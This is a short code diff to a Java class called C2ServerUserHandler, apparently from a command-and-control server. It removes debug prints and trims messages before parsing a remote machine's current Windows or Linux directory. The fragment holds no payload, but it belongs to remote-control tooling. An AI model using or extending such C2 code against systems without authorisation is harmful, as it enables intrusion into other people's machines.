@@ -272,15 +272,12 @@ public class C2ServerUserHandler implements Runnable{
             synchronized(messageQueue){
                 Object messages[] = messageQueue.toArray();
                 for(int i = messages.length - 1; i > 0; i--){
-                    System.out.println(messages[i].toString());
                     if(messages[i].toString().contains("C:\\")){
-                        System.out.println("Windows Pattern");
-                        currentDirectory = messages[i].toString().split(" ")[1];
+                        currentDirectory = messages[i].toString().trim().split(" ")[1];
                         break;
                     }
                     else if(messages[i].toString().contains("/")){
-                        System.out.println("Linux Pattern");
-                        currentDirectory = messages[i].toString().split(" ")[1];
+                        currentDirectory = messages[i].toString().trim().split(" ")[1];
                         break;
                     }
                 }
